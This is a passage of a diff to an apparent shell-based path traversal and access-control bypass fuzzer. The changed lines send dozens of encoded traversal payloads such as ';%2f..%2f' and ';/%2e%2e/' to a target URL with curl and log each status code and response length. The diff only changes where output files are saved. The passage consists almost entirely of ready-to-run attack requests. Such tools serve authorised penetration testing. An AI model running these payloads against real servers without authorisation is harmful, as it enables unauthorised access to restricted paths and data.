+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..%2f%2e%2e%2f%2f" -H "$user_agent")
 print
 echo -n "Payload [ ;%2f..%2f..%2f%2f ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..%2f..%2f%2f" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..%2f..%2f%2f" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..%2f..%2f%2f" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..%2f..%2f%2f" -H "$user_agent")
 print
 echo -n "Payload [ ;%2f..%2f/ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..%2f/" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..%2f/" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..%2f/" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..%2f/" -H "$user_agent")
 print
 echo -n "Payload [ ;%2f..%2f/..%2f ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..%2f/..%2f" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..%2f/..%2f" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..%2f/..%2f" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..%2f/..%2f" -H "$user_agent")
 print
 echo -n "Payload [ ;%2f..%2f/../ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..%2f/../" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..%2f/../" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..%2f/../" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..%2f/../" -H "$user_agent")
 print
 echo -n "Payload [ ;%2f../%2f..%2f ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f../%2f..%2f" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f../%2f..%2f" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f../%2f..%2f" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f../%2f..%2f" -H "$user_agent")
 print
 echo -n "Payload [ ;%2f../%2f../ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f../%2f../" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f../%2f../" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f../%2f../" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f../%2f../" -H "$user_agent")
 print
 echo -n "Payload [ ;%2f..//..%2f ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..//..%2f" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..//..%2f" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..//..%2f" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..//..%2f" -H "$user_agent")
 print
 echo -n "Payload [ ;%2f..//../ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..//../" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..//../" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..//../" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..//../" -H "$user_agent")
 print
 echo -n "Payload [ ;%2f../// ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..///" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..///" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..///" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..///" -H "$user_agent")
 print
 echo -n "Payload [ ;%2f..///; ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..///;" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..///;" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..///;" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..///;" -H "$user_agent")
 print
 echo -n "Payload [ ;%2f..//;/ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..//;/" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..//;/" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..//;/" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..//;/" -H "$user_agent")
 print
 echo -n "Payload [ ;%2f..//;/; ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..//;/;" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..//;/;" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..//;/;" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..//;/;" -H "$user_agent")
 print
 echo -n "Payload [ ;%2f../;// ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f../;//" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f../;//" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f../;//" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f../;//" -H "$user_agent")
 print
 echo -n "Payload [ ;%2f../;/;/ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f../;/;/" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f../;/;/" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f../;/;/" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f../;/;/" -H "$user_agent")
 print
 echo -n "Payload [ ;%2f../;/;/; ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f../;/;/;" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f../;/;/;" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f../;/;/;" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f../;/;/;" -H "$user_agent")
 print
 echo -n "Payload [ ;%2f..;/// ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..;///" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..;///" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..;///" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..;///" -H "$user_agent")
 print
 echo -n "Payload [ ;%2f..;//;/ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..;//;/" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..;//;/" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..;//;/" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..;//;/" -H "$user_agent")
 print
 echo -n "Payload [ ;%2f..;/;// ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..;/;//" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..;/;//" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..;/;//" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..;/;//" -H "$user_agent")
 print
 echo -n "Payload [ ;%2f/%2f../ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f/%2f../" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f/%2f../" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f/%2f../" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f/%2f../" -H "$user_agent")
 print
 echo -n "Payload [ ;%2f//..%2f ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f//..%2f" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f//..%2f" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f//..%2f" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f//..%2f" -H "$user_agent")
 print
 echo -n "Payload [ ;%2f//../ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f//../" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f//../" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f//../" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f//../" -H "$user_agent")
 print
 echo -n "Payload [ ;%2f//..;/ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f//..;/" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f//..;/" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f//..;/" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f//..;/" -H "$user_agent")
 print
 echo -n "Payload [ ;%2f/;/../ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f/;/../" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f/;/../" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f/;/../" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f/;/../" -H "$user_agent")
 print
 echo -n "Payload [ ;%2f/;/..;/ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f/;/..;/" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f/;/..;/" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f/;/..;/" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f/;/..;/" -H "$user_agent")
 print
 echo -n "Payload [ ;%2f;//../ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f;//../" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f;//../" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f;//../" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f;//../" -H "$user_agent")
 print
 echo -n "Payload [ ;%2f;/;/..;/ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f;/;/..;/" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f;/;/..;/" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f;/;/..;/" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f;/;/..;/" -H "$user_agent")
 print
 echo -n "Payload [ ;/%2e%2e ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/%2e%2e" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/%2e%2e" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/%2e%2e" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/%2e%2e" -H "$user_agent")
 print
 echo -n "Payload [ ;/%2e%2e%2f%2f ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/%2e%2e%2f%2f" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/%2e%2e%2f%2f" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/%2e%2e%2f%2f" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/%2e%2e%2f%2f" -H "$user_agent")
 print
 echo -n "Payload [ ;/%2e%2e%2f/ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/%2e%2e%2f/" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/%2e%2e%2f/" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/%2e%2e%2f/" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/%2e%2e%2f/" -H "$user_agent")
 print
 echo -n "Payload [ ;/%2e%2e/ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/%2e%2e/" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/%2e%2e/" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/%2e%2e/" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/%2e%2e/" -H "$user_agent")
 print
 echo -n "Payload [ ;/%2e. ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/%2e." -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/%2e." -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/%2e." -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/%2e." -H "$user_agent")
 print
 echo -n "Payload [ ;/%2f%2f../ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/%2f%2f../" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/%2f%2f../" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/%2f%2f../" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/%2f%2f../" -H "$user_agent")
 print
 echo -n "Payload [ ;/%2f/..%2f ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/%2f/..%2f" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/%2f/..%2f" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/%2f/..%2f" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/%2f/..%2f" -H "$user_agent")
 print
 echo -n "Payload [ ;/%2f/../ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/%2f/../" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/%2f/../" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/%2f/../" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/%2f/../" -H "$user_agent")
 print
 echo -n "Payload [ ;/.%2e ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/.%2e" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/.%2e" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/.%2e" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/.%2e" -H "$user_agent")
 print
 echo -n "Payload [ ;/.%2e/%2e%2e/%2f ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/.%2e/%2e%2e/%2f" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/.%2e/%2e%2e/%2f" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/.%2e/%2e%2e/%2f" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/.%2e/%2e%2e/%2f" -H "$user_agent")
 print
 echo -n "Payload [ ;/.. ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/.." -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/.." -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/.." -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/.." -H "$user_agent")
 print
 echo -n "Payload [ ;/..%2f ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/..%2f" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/..%2f" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/..%2f" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/..%2f" -H "$user_agent")
 print
 echo -n "Payload [ ;/..%2f%2f../ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/..%2f%2f../" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/..%2f%2f../" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/..%2f%2f../" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/..%2f%2f../" -H "$user_agent")
 print
 echo -n "Payload [ ;/..%2f..%2f ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/..%2f..%2f" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/..%2f..%2f" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/..%2f..%2f" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/..%2f..%2f" -H "$user_agent")
 print
 echo -n "Payload [ ;/..%2f/ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/..%2f/" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/..%2f/" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/..%2f/" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/..%2f/" -H "$user_agent")
 print
 echo -n "Payload [ ;/..%2f// ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/..%2f//" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/..%2f//" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/..%2f//" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/..%2f//" -H "$user_agent")
 print
 echo -n "Payload [ ;/../ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/../" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/../" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/../" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/../" -H "$user_agent")
 print
 echo -n "Payload [ ;/../%2f/ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/../%2f/" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/../%2f/" -H "$user_agent")
